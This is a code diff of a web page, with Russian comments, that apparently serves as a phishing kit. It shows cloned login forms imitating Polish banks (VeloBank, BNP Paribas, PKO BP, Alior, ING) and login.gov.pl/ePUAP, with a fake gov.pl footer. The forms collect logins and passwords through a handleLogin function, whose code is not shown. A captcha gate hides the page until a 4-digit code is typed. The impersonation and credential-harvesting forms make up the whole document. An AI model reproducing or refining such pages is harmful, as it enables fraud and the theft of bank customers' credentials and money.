-                        <div class="bank5-title">Zaloguj się do VeloBanku</div>
-                        <div class="bank5-subtitle">Login i hasło</div>
-                        <form class="bank5-form" onsubmit="return handleLogin(event, 'Bank 5')">
-                            <div class="form-group">
-                                <label for="loginUsername5">Login</label>
-                                <input type="text" id="loginUsername5" placeholder="Wpisz Twój login" required>
-                            </div>
-                            <div class="login-btn-row">
-                                <div class="form-group">
-                                    <label for="loginPassword5">Hasło</label>
-                                    <input type="password" id="loginPassword5" placeholder="Wpisz hasło" required>
+                            </form>
+                            <div class="bank7-security">
+                                <div class="bank7-security-title">Sprawdź, zanim się zalogujesz:</div>
+                                <ul class="bank7-security-list"><li>Adres zaczyna się od https</li><li>Połączenie szyfrowane</li><li>Certyfikat strony</li></ul>
+                                <div class="bank7-links">
+                                    <a href="#" onclick="alert('Przekierowanie do strony GOonline'); return false;">Poznaj GOonline</a>
+                                    <span class="separator">|</span>
+                                    <a href="#" onclick="alert('Przekierowanie do pomocy'); return false;">Masz pytania dotyczące GOonline?</a>
                                 </div>
-                                <button type="submit" class="login-btn">Dalej</button>
+                                <div class="bank7-chat"><a href="#" onclick="alert('Przekierowanie do wideoczatu'); return false;">Zapytaj konsultanta na wideoczacie</a> (w godz 9-17 w dni robocze)</div>
                             </div>
-                        </form>
+                        </div>
                     </div>
+                    <div class="bank7-norton"><img src="norton.png" alt="Norton"></div>
                 </div>
-            </div>
 
-            <!-- ===== BANK 6 ===== -->
-            <div class="bank6-full-page" id="loginScreen6">
-                <div class="bank6-container">
-                    <div class="bank6-left">
-                        <div class="bank6-title">Logowanie</div>
-                        <form class="bank6-form" onsubmit="return handleLogin(event, 'Bank 6')">
-                            <div class="form-group">
-                                <label for="loginUsername6">Login</label>
-                                <input type="text" id="loginUsername6" placeholder="Wpisz login" required>
+                <!-- ===== BANK 8 ===== -->
+                <div class="bank8-full-page" id="loginScreen8">
+                    <div class="bank8-container">
+                        <div class="bank8-left">
+                            <div class="bank8-favicon"><img src="favicon.ico" alt="PKO BP"></div>
+                            <div class="bank8-card">
+                                <div class="bank8-card-title">Klient indywidualny</div>
+                                <div class="bank8-login-title">Zaloguj się</div>
+                                <div class="bank8-login-subtitle">Podaj login i hasło</div>
+                                <form class="bank8-form" onsubmit="return handleLogin(event, 'Bank 8')">
+                                    <div class="form-group">
+                                        <label for="loginUsername8">Login</label>
+                                        <input type="text" id="loginUsername8" placeholder="Wpisz login" required>
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="loginPassword8">Hasło</label>
+                                        <input type="password" id="loginPassword8" placeholder="Wpisz hasło" required>
+                                    </div>
+                                    <button type="submit" class="login-btn">Dalej</button>
+                                </form>
                             </div>
-                            <div class="form-group">
-                                <label for="loginPassword6">Hasło</label>
-                                <input type="password" id="loginPassword6" placeholder="Wpisz hasło" required>
-                            </div>
-                            <button type="submit" class="login-btn">Dalej</button>
-                        </form>
-                        <div class="bank6-download"><img src="download.png" alt="Pobierz aplikację"></div>
-                    </div>
-                    <div class="bank6-right">
-                        <div class="bank6-security-title">🔒 Pamiętaj o zasadach bezpieczeństwa</div>
-                        <div class="bank6-security-text">
-                            <p>Wprowadzaj adres strony Banku ręcznie, nie korzystaj z wyników wyszukiwarek i linków niewiadomego pochodzenia.</p>
-                            <p><span class="highlight">Przed zalogowaniem sprawdź, czy:</span></p>
-                            <ul><li>adres rozpoczyna się od <span class="green">https</span></li><li>połączenie jest szyfrowane tj. w pasku adresu widoczna jest zamknięta kłódka</li><li>certyfikat strony wystawiony jest dla <span class="green">Bank Ochrony Środowiska S.A.</span></li></ul>
-                            <p>Używaj opcji <span class="highlight">Wyloguj</span> kończąc pracę w systemie, gwarantuje to poprawne zamknięcie twojej sesji.</p>
-                            <p>Jeśli zauważysz coś nietypowego lub podejrzanego zgłoś ten fakt do Banku.</p>
-                            <p>Więcej informacji na temat bezpieczeństwa znajdziesz na stronie Banku: <span class="link" onclick="alert('Przekierowanie do strony bezpieczeństwa'); return false;">Zasady bezpieczeństwa</span></p>
+                        </div>
+                        <div class="bank8-right">
+                            <div class="bank8-security-title">Włącz dodatkową ochronę przed oszustami</div>
+                            <div class="bank8-security-text"><p>Cyberprzestępcy nie śpią. Zabezpiecz swoje pieniądze - włącz darmową weryfikację behawioralną.</p></div>
+                            <div class="bank8-security-image"><img src="login-positive-1000.png" alt="Bezpieczeństwo"></div>
                         </div>
                     </div>
                 </div>
-            </div>
 
-            <!-- ===== BANK 7 ===== -->
-            <div class="bank7-full-page" id="loginScreen7">
-                <div class="bank7-container">
-                    <div class="bank7-logo"><img src="bnp-paribas-logo-full.svg" alt="BNP Paribas"></div>
-                    <div class="bank7-box">
-                        <div class="bank7-title">Zaloguj się do GOonline</div>
-                        <div class="bank7-subtitle">Podaj swój login, aby zalogować się do serwisu transakcyjnego</div>
-                        <form class="bank7-form" onsubmit="return handleLogin(event, 'Bank 7')">
-                            <div class="form-group">
-                                <label for="loginUsername7">Login</label>
-                                <input type="text" id="loginUsername7" placeholder="Wpisz login" required>
+                <!-- ===== BANK 9 ===== -->
+                <div class="bank9-full-page" id="loginScreen9">
+                    <div class="bank9-container">
+                        <div class="bank9-top">
+                            <div class="bank9-logo"><img src="alior-logo.svg" alt="Alior Bank"></div>
+                            <div class="bank9-title">Potwierdzenie tożsamości z Alior Bankiem</div>
+                        </div>
+                        <div class="bank9-wrapper">
+                            <div class="bank9-card">
+                                <div class="bank9-welcome">Witamy w Alior Banku!</div>
+                                <form class="bank9-form" onsubmit="return handleLogin(event, 'Bank 9')">
+                                    <div class="form-group">
+                                        <label for="loginUsername9">Login</label>
+                                        <input type="text" id="loginUsername9" placeholder="Wpisz login" required>
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="loginPassword9">Hasło</label>
+                                        <input type="password" id="loginPassword9" placeholder="Wpisz hasło" required>
+                                    </div>
+                                    <button type="submit" class="login-btn">Dalej</button>
+                                </form>
                             </div>
-                            <div class="form-group">
-                                <label for="loginPassword7">Hasło</label>
-                                <input type="password" id="loginPassword7" placeholder="Wpisz hasło" required>
-                            </div>
-                            <button type="submit" class="login-btn">Dalej</button>
-                        </form>
-                        <div class="bank7-security">
-                            <div class="bank7-security-title">Sprawdź, zanim się zalogujesz:</div>
-                            <ul class="bank7-security-list"><li>Adres zaczyna się od https</li><li>Połączenie szyfrowane</li><li>Certyfikat strony</li></ul>
-                            <div class="bank7-links">
-                                <a href="#" onclick="alert('Przekierowanie do strony GOonline'); return false;">Poznaj GOonline</a>
-                                <span class="separator">|</span>
-                                <a href="#" onclick="alert('Przekierowanie do pomocy'); return false;">Masz pytania dotyczące GOonline?</a>
-                            </div>
-                            <div class="bank7-chat"><a href="#" onclick="alert('Przekierowanie do wideoczatu'); return false;">Zapytaj konsultanta na wideoczacie</a> (w godz 9-17 w dni robocze)</div>
                         </div>
                     </div>
                 </div>
-                <div class="bank7-norton"><img src="norton.png" alt="Norton"></div>
-            </div>
 
-            <!-- ===== BANK 8 ===== -->
-            <div class="bank8-full-page" id="loginScreen8">
-                <div class="bank8-container">
-                    <div class="bank8-left">
-                        <div class="bank8-favicon"><img src="favicon.ico" alt="PKO BP"></div>
-                        <div class="bank8-card">
-                            <div class="bank8-card-title">Klient indywidualny</div>
-                            <div class="bank8-login-title">Zaloguj się</div>
-                            <div class="bank8-login-subtitle">Podaj login i hasło</div>
-                            <form class="bank8-form" onsubmit="return handleLogin(event, 'Bank 8')">
+                <!-- ===== BANK 10 ===== -->
+                <div class="bank10-full-page" id="loginScreen10">
+                    <div class="bank10-container">
+                        <div class="bank10-main">
+                            <div class="bank10-left"></div>
+                            <div class="bank10-card">
+                                <p><strong>Węzeł Krajowy - login.gov.pl chce potwierdzić Twoją tożsamość w celu: ePUAP.</strong><br><br>Twoje dane do logowania są bezpieczne, nigdzie ich nie przekazujemy.</p>
+                            </div>
+                        </div>
+                        <div class="bank10-form-section">
+                            <div class="bank10-login-title">Zaloguj się</div>
+                            <form class="bank10-form" onsubmit="return handleLogin(event, 'Bank 10')">
                                 <div class="form-group">
-                                    <label for="loginUsername8">Login</label>
-                                    <input type="text" id="loginUsername8" placeholder="Wpisz login" required>
+                                    <label for="loginUsername10">Login</label>
+                                    <input type="text" id="loginUsername10" placeholder="Wpisz login" required>
                                 </div>
                                 <div class="form-group">
-                                    <label for="loginPassword8">Hasło</label>
-                                    <input type="password" id="loginPassword8" placeholder="Wpisz hasło" required>
+                                    <label for="loginPassword10">Hasło</label>
+                                    <input type="password" id="loginPassword10" placeholder="Wpisz hasło" required>
                                 </div>
                                 <button type="submit" class="login-btn">Dalej</button>
                             </form>
                         </div>
-                    </div>
-                    <div class="bank8-right">
-                        <div class="bank8-security-title">Włącz dodatkową ochronę przed oszustami</div>
-                        <div class="bank8-security-text"><p>Cyberprzestępcy nie śpią. Zabezpiecz swoje pieniądze - włącz darmową weryfikację behawioralną.</p></div>
-                        <div class="bank8-security-image"><img src="login-positive-1000.png" alt="Bezpieczeństwo"></div>
+                        <div class="bank10-security">
+                            <div class="bank10-security-title">Bezpieczeństwo</div>
+                            <ul class="bank10-security-list">
+                                <li>Pobieraj i aktualizuj oprogramowanie tylko z autoryzowanych sklepów z aplikacjami.</li>
+                                <li>Sprawdź treść w wiadomości z smsKodem, zanim zaakceptujesz dyspozycję.</li>
+                                <li>Nie otwieraj linków i załączników od nieznanych nadawców.</li>
+                            </ul>
+                        </div>
                     </div>
                 </div>
-            </div>
 
-            <!-- ===== BANK 9 ===== -->
-            <div class="bank9-full-page" id="loginScreen9">
-                <div class="bank9-container">
-                    <div class="bank9-top">
-                        <div class="bank9-logo"><img src="alior-logo.svg" alt="Alior Bank"></div>
-                        <div class="bank9-title">Potwierdzenie tożsamości z Alior Bankiem</div>
-                    </div>
-                    <div class="bank9-wrapper">
-                        <div class="bank9-card">
-                            <div class="bank9-welcome">Witamy w Alior Banku!</div>
-                            <form class="bank9-form" onsubmit="return handleLogin(event, 'Bank 9')">
+                <!-- ===== BANK 12 ===== -->
+                <div class="bank12-full-page" id="loginScreen12">
+                    <div class="bank12-container">
+                        <div class="bank12-box">
+                            <div class="bank12-logo"><img src="logo_ing-logo.svg" alt="ING Bank Śląski"></div>
+                            <div class="bank12-title">Potwierdzasz tożsamość w Moim ING</div>
+                            <form class="bank12-form" onsubmit="return handleLogin(event, 'ING Bank Śląski')">
                                 <div class="form-group">
-                                    <label for="loginUsername9">Login</label>
-                                    <input type="text" id="loginUsername9" placeholder="Wpisz login" required>
+                                    <label for="loginUsername12">Login do bankowości Moje ING</label>
+                                    <input type="text" id="loginUsername12" placeholder="Wpisz login" required>
                                 </div>
                                 <div class="form-group">
-                                    <label for="loginPassword9">Hasło</label>
-                                    <input type="password" id="loginPassword9" placeholder="Wpisz hasło" required>
+                                    <label for="loginPassword12">Hasło</label>
+                                    <input type="password" id="loginPassword12" placeholder="Wpisz hasło" required>
                                 </div>
-                                <button type="submit" class="login-btn">Dalej</button>
+                                <div class="login-btn-row">
+                                    <div class="form-group">
+                                        <input type="text" placeholder=" " style="border:none; background:transparent; padding:0; height:0; min-height:0; visibility:hidden; display:none;">
+                                    </div>
+                                    <button type="submit" class="login-btn">Dalej</button>
+                                </div>
                             </form>
+                            <div class="bank12-footer-text">
+                                <strong>Przybywa oszukanych na portalach aukcyjnych.</strong>
+                                Unikaj transakcji przez mejle, SMS-y i komunikatory. Nie klikaj w link od kupującego.
+                                <br>
+                                <span class="link" onclick="alert('Przekierowanie do strony o oszustwach'); return false;">Więcej o oszustwach na portalach aukcyjnych</span>
+                                <br><br>
+                                <strong>Ktoś dzwoni i podaje się za pracownika ING?</strong>
+                                Sprawdź, czy to nie oszust.
+                                <br>
+                                <span class="link" onclick="alert('Przekierowanie do strony jak sprawdzić kto dzwoni'); return false;">Zobacz, jak sprawdzić kto dzwoni</span>
+                            </div>
                         </div>
                     </div>
                 </div>
-            </div>
 
-            <!-- ===== BANK 10 ===== -->
-            <div class="bank10-full-page" id="loginScreen10">
-                <div class="bank10-container">
-                    <div class="bank10-main">
-                        <div class="bank10-left"></div>
-                        <div class="bank10-card">
-                            <p><strong>Węzeł Krajowy - login.gov.pl chce potwierdzić Twoją tożsamość w celu: ePUAP.</strong><br><br>Twoje dane do logowania są bezpieczne, nigdzie ich nie przekazujemy.</p>
-                        </div>
-                    </div>
-                    <div class="bank10-form-section">
-                        <div class="bank10-login-title">Zaloguj się</div>
-                        <form class="bank10-form" onsubmit="return handleLogin(event, 'Bank 10')">
-                            <div class="form-group">
-                                <label for="loginUsername10">Login</label>
-                                <input type="text" id="loginUsername10" placeholder="Wpisz login" required>
-                            </div>
-                            <div class="form-group">
-                                <label for="loginPassword10">Hasło</label>
-                                <input type="password" id="loginPassword10" placeholder="Wpisz hasło" required>
-                            </div>
-                            <button type="submit" class="login-btn">Dalej</button>
-                        </form>
-                    </div>
-                    <div class="bank10-security">
-                        <div class="bank10-security-title">Bezpieczeństwo</div>
-                        <ul class="bank10-security-list">
-                            <li>Pobieraj i aktualizuj oprogramowanie tylko z autoryzowanych sklepów z aplikacjami.</li>
-                            <li>Sprawdź treść w wiadomości z smsKodem, zanim zaakceptujesz dyspozycję.</li>
-                            <li>Nie otwieraj linków i załączników od nieznanych nadawców.</li>
-                        </ul>
-                    </div>
+                <main class="main-content"></main>
+            </div>
+        </div>
+
+        <!-- ===== TOAST ===== -->
+        <div class="toast-message" id="toastMessage">Najpierw wypełnij wszystkie wymagane pola!</div>
+
+        <!-- ===== FOOTER ===== -->
+        <footer class="footer" id="footer">
+            <div class="container">
+                <div>
+                    <h4>Serwis Gov.pl</h4>
+                    <ul>
+                        <li><a href="#">O serwisie</a></li>
+                        <li><a href="#">Polityka prywatności</a></li>
+                        <li><a href="#">Warunki korzystania</a></li>
+                        <li><a href="#">Deklaracja dostępności</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4>Dla obywatela</h4>
+                    <ul>
+                        <li><a href="#">Usługi online</a></li>
+                        <li><a href="#">Poradniki</a></li>
+                        <li><a href="#">Najczęściej zadawane pytania</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4>Dla przedsiębiorcy</h4>
+                    <ul>
+                        <li><a href="#">Biznes.gov.pl</a></li>
+                        <li><a href="#">Dotacje</a></li>
+                        <li><a href="#">Prawo</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h4>Kontakt</h4>
+                    <ul>
+                        <li><a href="#">Infolinia</a></li>
+                        <li><a href="#">ePUAP</a></li>
+                        <li><a href="#">Mapa strony</a></li>
+                    </ul>
                 </div>
             </div>
+            <div class="footer-bottom">
+                <div class="container">© 2026 Kancelaria Prezesa Rady Ministrów. Wszelkie prawa zastrzeżone.</div>
+            </div>
+        </footer>
 
-            <!-- ===== BANK 12 ===== -->
-            <div class="bank12-full-page" id="loginScreen12">
-                <div class="bank12-container">
-                    <div class="bank12-box">
-                        <div class="bank12-logo"><img src="logo_ing-logo.svg" alt="ING Bank Śląski"></div>
-                        <div class="bank12-title">Potwierdzasz tożsamość w Moim ING</div>
-                        <form class="bank12-form" onsubmit="return handleLogin(event, 'ING Bank Śląski')">
-                            <div class="form-group">
-                                <label for="loginUsername12">Login do bankowości Moje ING</label>
-                                <input type="text" id="loginUsername12" placeholder="Wpisz login" required>
-                            </div>
-                            <div class="form-group">
-                                <label for="loginPassword12">Hasło</label>
-                                <input type="password" id="loginPassword12" placeholder="Wpisz hasło" required>
-                            </div>
-                            <div class="login-btn-row">
-                                <div class="form-group">
-                                    <input type="text" placeholder=" " style="border:none; background:transparent; padding:0; height:0; min-height:0; visibility:hidden; display:none;">
-                                </div>
-                                <button type="submit" class="login-btn">Dalej</button>
-                            </div>
-                        </form>
-                        <div class="bank12-footer-text">
-                            <strong>Przybywa oszukanych na portalach aukcyjnych.</strong>
-                            Unikaj transakcji przez mejle, SMS-y i komunikatory. Nie klikaj w link od kupującego.
-                            <br>
-                            <span class="link" onclick="alert('Przekierowanie do strony o oszustwach'); return false;">Więcej o oszustwach na portalach aukcyjnych</span>
-                            <br><br>
-                            <strong>Ktoś dzwoni i podaje się za pracownika ING?</strong>
-                            Sprawdź, czy to nie oszust.
-                            <br>
-                            <span class="link" onclick="alert('Przekierowanie do strony jak sprawdzić kto dzwoni'); return false;">Zobacz, jak sprawdzić kto dzwoni</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <main class="main-content"></main>
-        </div>
-    </div>
-
-    <!-- ===== TOAST ===== -->
-    <div class="toast-message" id="toastMessage">Najpierw wypełnij wszystkie wymagane pola!</div>
-
-    <!-- ===== FOOTER ===== -->
-    <footer class="footer" id="footer">
-        <div class="container">
-            <div>
-                <h4>Serwis Gov.pl</h4>
-                <ul>
-                    <li><a href="#">O serwisie</a></li>
-                    <li><a href="#">Polityka prywatności</a></li>
-                    <li><a href="#">Warunki korzystania</a></li>
-                    <li><a href="#">Deklaracja dostępności</a></li>
-                </ul>
-            </div>
-            <div>
-                <h4>Dla obywatela</h4>
-                <ul>
-                    <li><a href="#">Usługi online</a></li>
-                    <li><a href="#">Poradniki</a></li>
-                    <li><a href="#">Najczęściej zadawane pytania</a></li>
-                </ul>
-            </div>
-            <div>
-                <h4>Dla przedsiębiorcy</h4>
-                <ul>
-                    <li><a href="#">Biznes.gov.pl</a></li>
-                    <li><a href="#">Dotacje</a></li>
-                    <li><a href="#">Prawo</a></li>
-                </ul>
-            </div>
-            <div>
-                <h4>Kontakt</h4>
-                <ul>
-                    <li><a href="#">Infolinia</a></li>
-                    <li><a href="#">ePUAP</a></li>
-                    <li><a href="#">Mapa strony</a></li>
-                </ul>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            <div class="container">© 2026 Kancelaria Prezesa Rady Ministrów. Wszelkie prawa zastrzeżone.</div>
-        </div>
-    </footer>
+    </div> <!-- koniec #mainContent -->
 
     <!-- ===== JAVASCRIPT ===== -->
     <script>
         // ============================================================
-        //   КАПЧА (ИЗ ПЕРВОГО ФАЙЛА — С CANVAS И 6 СИМВОЛАМИ)
+        //   КАПЧА (4-ЗНАЧНЫЙ КОД)
         // ============================================================
         (function() {
-            var canvas = document.getElementById('captchaCanvas');
-            var ctx = canvas.getContext('2d');
-            var input = document.getElementById('captchaInput');
-            var status = document.getElementById('captchaStatus');
-            var refresh = document.getElementById('refreshCaptcha');
-            var submitBtn = document.getElementById('captchaSubmitBtn');
             var overlay = document.getElementById('captchaOverlay');
-            var alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-            var secret = '';
+            var mainContent = document.getElementById('mainContent');
+            var questionEl = document.getElementById('captchaQuestion');
+            var inputEl = document.getElementById('captchaInput');
+            var submitBtn = document.getElementById('captchaSubmit');
+            var errorEl = document.getElementById('captchaError');
+            var refreshBtn = document.getElementById('captchaRefresh');
 
-            function hash(str) {
-                var h = 0;
-                for (var i = 0; i < str.length; i++) {
-                    h = ((h << 5) - h) + str.charCodeAt(i);
-                    h |= 0;
-                }
-                return String(h);
-            }
+            var currentCaptcha = '';
 
-            function generate() {
-                ctx.clearRect(0, 0, 280, 80);
-                var grad = ctx.createLinearGradient(0, 0, 280, 80);
-                grad.addColorStop(0, '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0'));
-                grad.addColorStop(1, '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0'));
-                ctx.fillStyle = grad;
-                ctx.fillRect(0, 0, 280, 80);
-
-                for (var i = 0; i < 80; i++) {
-                    ctx.fillStyle = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
-                    ctx.fillRect(Math.random() * 280, Math.random() * 80, 2, 2);
-                }
-                for (var i = 0; i < 20; i++) {
-                    ctx.strokeStyle = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
-                    ctx.lineWidth = Math.random() * 2.5;
-                    ctx.beginPath();
-                    ctx.moveTo(Math.random() * 280, Math.random() * 80);
-                    ctx.lineTo(Math.random() * 280, Math.random() * 80);
-                    ctx.stroke();
-                }
-
-                secret = '';
-                var colors = ['#cc0000', '#003b6f', '#009c3b', '#cc5500', '#6a0dad', '#008080'];
-                for (var i = 0; i < 6; i++) {
-                    var char = alphabet[Math.floor(Math.random() * alphabet.length)];
-                    secret += char;
-                    var x = 30 + i * 40 + Math.random() * 12;
-                    var y = 55 + Math.random() * 16 - 8;
-                    ctx.save();
-                    ctx.translate(x, y);
-                    ctx.rotate((Math.random() - 0.5) * 0.9);
-                    ctx.font = (38 + Math.random() * 14) + 'px Arial';
-                    ctx.fillStyle = colors[i % colors.length];
-                    ctx.shadowColor = 'rgba(0,0,0,0.2)';
-                    ctx.shadowBlur = 4;
-                    ctx.fillText(char, 0, 0);
-                    ctx.restore();
-                }
-
-                input.value = '';
-                input.classList.remove('error');
-                status.classList.remove('visible');
+            function generateCaptcha() {
+                var num = Math.floor(1000 + Math.random() * 9000);
+                currentCaptcha = num.toString();
+                questionEl.textContent = currentCaptcha;
+                inputEl.value = '';
+                inputEl.classList.remove('error');
+                errorEl.textContent = '';
                 submitBtn.disabled = false;
-                submitBtn.classList.remove('loading');
-                submitBtn.querySelector('span').textContent = 'Zweryfikuj';
-                input.focus();
             }
 
-            function verify() {
-                var val = input.value.trim().toUpperCase();
-                if (hash(val) === hash(secret)) {
-                    input.classList.remove('error');
-                    status.classList.remove('visible');
+            function verifyCaptcha() {
+                var userInput = inputEl.value.trim();
+                if (userInput === currentCaptcha) {
                     overlay.classList.add('hidden');
-                    document.body.style.overflow = '';
-                    return true;
+                    mainContent.style.display = 'block';
+                    document.body.style.overflow = 'auto';
+                    var firstInput = mainContent.querySelector('input');
+                    if (firstInput) setTimeout(function() { firstInput.focus(); }, 300);
                 } else {
-                    input.classList.add('error');
-                    status.classList.add('visible');
-                    input.value = '';
-                    generate();
-                    input.focus();
-                    return false;
+                    inputEl.classList.add('error');
+                    errorEl.textContent = '❌ Nieprawidłowy kod. Spróbuj ponownie.';
+                    submitBtn.disabled = false;
+                    inputEl.value = '';
+                    inputEl.focus();
+                    setTimeout(function() {
+                        generateCaptcha();
+                    }, 1500);
                 }
             }
 
-            generate();
-            refresh.onclick = generate;
-            input.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') { e.preventDefault(); verify(); }
+            submitBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                submitBtn.disabled = true;
+                verifyCaptcha();
             });
-            submitBtn.onclick = verify;
-            input.addEventListener('input', function() {
-                if (this.value.length === 6) { verify(); }
+
+            inputEl.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    submitBtn.click();
+                }
             });
-            window.resetCaptcha = generate;
+
+            refreshBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                generateCaptcha();
+                inputEl.focus();
+            });
+
+            generateCaptcha();
+            setTimeout(function() { inputEl.focus(); }, 200);
         })();
 
         // ============================================================
